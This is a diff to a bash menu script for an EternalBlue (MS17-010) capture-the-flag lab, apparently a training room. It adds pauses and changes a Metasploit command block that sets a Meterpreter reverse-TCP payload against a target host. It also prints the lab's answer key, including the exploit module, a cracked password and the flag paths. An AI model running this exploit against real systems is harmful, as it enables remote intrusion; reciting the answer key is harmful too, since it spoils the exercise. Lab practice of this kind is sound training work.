@@ -140,7 +140,7 @@ echo ""
 echo "========================================="
 echo "     ✅ END OF ETERNALBLUE INTRO         "
 echo "========================================="
-
+read -p "\n[*] Press Enter to return to the menu..."
 }
 
 # 📋 Lab task checklist
@@ -163,7 +163,8 @@ show_tasks() {
     echo "7. Dump and crack hashes"
      sleep 1
     echo "8. Find the flags "
-     sleep 1
+     sleep 4
+     read -p "\n[*] Press Enter to return to the menu..."
 }
 
 # 🔌 Function: Connect VPN only
@@ -177,6 +178,7 @@ clear
 
     echo "[+] Starting VPN..."
     sudo openvpn --config "$vpnfile"
+    read -p "\n[*] Press Enter to return to the menu..."
 }
 # ⚔️ Function: Run full exploit process
 exploit_lab() {
@@ -213,7 +215,7 @@ set RHOSTS $rhost;
 set LHOST $lhost;
 set LPORT $lport;
 set PAYLOAD windows/x64/meterpreter/reverse_tcp;
-exploit;
+exploit -j;
 exit;"
 }
 
@@ -223,26 +225,38 @@ show_answers() {
     clear
     echo "🔹 How many ports under 1000 are open?"
     echo "➡️  3"
+     sleep 1
     echo "🔹 Vulnerable to?"
     echo "➡️  ms17-010"
+     sleep 1
     echo "🔹 Exploit path?"
     echo "➡️  exploit/windows/smb/ms17_010_eternalblue"
+     sleep 1
     echo "🔹 Required option name?"
     echo "➡️  RHOSTS"
+     sleep 1
     echo "🔹 Shell-to-Meterpreter module?"
     echo "➡️  post/multi/manage/shell_to_meterpreter"
+     sleep 1
     echo "🔹 Required post module option?"
     echo "➡️  SESSION"
+     sleep 1
     echo "🔹 Non-default user?"
     echo "➡️  jon"
+     sleep 1
     echo "🔹 Cracked password?"
     echo "➡️  alqfna22"
+     sleep 1
     echo "🔹 Flag1:"
     echo "➡️  C:\\flag1.txt"
+     sleep 1
     echo "🔹 Flag2:"
     echo "➡️  C:\\Windows\\System32\\config\\flag2.txt"
+     sleep 1
     echo "🔹 Flag3:"
     echo "➡️  C:\\Users\\Administrator\\Documents\\flag3.txt"
+     sleep 1
+    read -p "\n[*] Press Enter to return to the menu..."
 }
 
 # 🧱 Main menu loop
